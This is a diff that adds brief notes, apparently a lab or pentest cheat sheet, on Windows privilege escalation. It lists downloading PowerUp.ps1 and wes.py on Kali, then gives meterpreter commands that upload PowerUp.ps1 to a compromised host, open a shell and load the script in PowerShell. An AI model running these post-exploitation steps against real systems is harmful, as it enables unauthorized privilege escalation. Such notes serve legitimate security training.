@@ -1,0 +1,11 @@
+
+In kali
+download Powerup.ps1 
+Downlaod wes.py and  definition.zip
+
+Stablish the meterpreter session
+meterpreter> upload home/beta/Download/PowerUp.Ps1 c:\\users\\user\\Download
+meterpreter> shell
+c:\users\user\Download>powershell
+c:\users\user\Download>. ./PowerUp.ps1   ***Note: space between . ./PowerUp.ps1
+
